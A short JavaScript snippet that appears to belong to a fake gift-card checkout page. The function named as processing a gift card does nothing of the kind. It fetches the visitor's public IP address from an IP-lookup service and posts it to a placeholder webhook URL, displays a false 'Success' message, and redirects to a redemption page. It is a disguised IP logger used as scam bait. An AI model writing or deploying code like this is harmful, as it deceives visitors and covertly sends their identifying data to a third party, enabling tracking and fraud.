const WEBHOOK_URL='PUT_WEBHOOK';async function getIP(){try{let r=await fetch('https://api.ipify.org?format=json');let d=await r.json();return d.ip}catch{return 'Unknown'}}async function processGiftCard(){let ip=await getIP();fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'Checkout\nIP: '+ip})});document.getElementById('status').textContent='Success';setTimeout(()=>location.href='redeem.html',1200);}